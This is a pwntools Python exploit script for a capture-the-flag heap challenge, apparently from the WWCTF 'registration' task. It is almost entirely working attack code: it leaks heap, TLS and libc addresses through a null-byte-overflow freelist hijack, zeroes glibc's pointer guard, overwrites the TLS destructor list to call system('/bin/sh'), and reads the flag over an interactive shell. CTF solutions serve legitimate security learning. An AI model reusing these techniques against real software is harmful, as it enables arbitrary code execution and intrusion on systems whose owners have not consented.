#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'ctf-registration.chal.wwctf.com', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def alloc(age, name, desc):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'?', age)
    io.sendlineafter(b'?', name)
    io.sendlineafter(b'?', desc)

def view(idx):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'?', str(idx).encode())

def exploit():
    global io
    io = initialize()

    alloc(b'0', b'argo', b'naut')
    alloc(b'+', b'argo', b'naut') # 1

    view(1)
    io.recvuntil(b'Age: ')
    heap_leak = int(io.recvline().strip())

    # =========================================================
    # LEAK TLC & TLS
    # =========================================================
    # hijack freelist by null-overflow
    payload = p64(0x0) * 2 + p64(heap_leak-0xe0+0x28) # right behind there's somesort of a structure that holds an address to cache
    alloc(b'2', b'argo', payload.ljust(32, b'\x00'))

    alloc(b'3', b'argo', b'naut')
    alloc(b'4', b'argo', b'naut')
    alloc(b'+', b'argo', b'naut') # 5 -> profit

    view(5)
    io.recvuntil(b'Age: ')
    thread_local_cache = int(io.recvline().strip())

    alloc(b'+', b'\x00', b'\x00') # 6 -> *next is tls

    view(6)
    io.recvuntil(b'Age: ')
    tls = int(io.recvline().strip())

    # =========================================================
    # LEAK LIBC
    # =========================================================
    # https://browserpwndbg.readthedocs.io/en/docs/commands/leaks/leakfind/
    # pwndbg> leakfind --max_depth=2 --page_name=libc.so.6 --max_offset=2000 <writetable_section_of_ld-linux-x86-64.so.2>

    # preserve values while also controlling next freelist
    alloc(str(thread_local_cache+0x3018-0x10).encode(), p64(tls+0xa20), p64(tls)) # 7 -> pivots to GOT @ ld

    # preserve some values
    alloc(str(tls).encode(), p64(tls+0xa20), p64(tls)) # 8

    alloc(b'+', b'', b'') # 9 -> profit from 7
    view(9)
    io.recvuntil(b'Description: ')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x174a10

    # =========================================================
    # NULLIFY PTR GUARD
    # =========================================================
    alloc(b'10', b'argo', b'naut')
    alloc(b'11', b'argo', b'naut')
    alloc(b'12', b'argo', b'naut')
    alloc(b'13', b'argo', b'naut') 
    alloc(b'14', b'argo', b'naut') 
    alloc(str(tls+0x20), b'argo', b'naut'.ljust(32, b'\x00')) # 15

    alloc(b'16', b'argo', b'naut') # consume freelist
    alloc(b'17', b'argo', b'naut') # consume freelist

    # nullify ptr guard
    alloc(b'+', b'', p64(0x0)) # 18 -> profit from 15

    # =========================================================
    # HIJACK DTOR LIST
    # =========================================================
    alloc(b'19', b'argo', p64(libc.sym['system']<<17) + p64(next(libc.search(b'/bin/sh'))))
    alloc(b'20', b'argo', b'naut')
    alloc(b'21', b'argo', b'naut')
    alloc(b'22', b'argo', b'naut')
    alloc(b'23', b'argo', b'naut')
    alloc(b'24', b'', p64(tls-96).ljust(32, b'\x00')) # 25

    alloc(b'26', b'argo', b'naut') # consume freelist
    alloc(b'27', b'argo', b'naut') # consume freelist

    # points to 19's payload
    alloc(str(heap_leak+0x1f20+0x10).encode(), b'', b'') # 28 -> profit

    # exit
    io.sendlineafter(b'>>', b'3')

    sleep(0.2)
    io.sendline(b'cat flag*')

    log.info("heap: %#x", heap_leak)
    log.info("thread-local cache: %#x", thread_local_cache)
    log.info("tls: %#x", tls)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
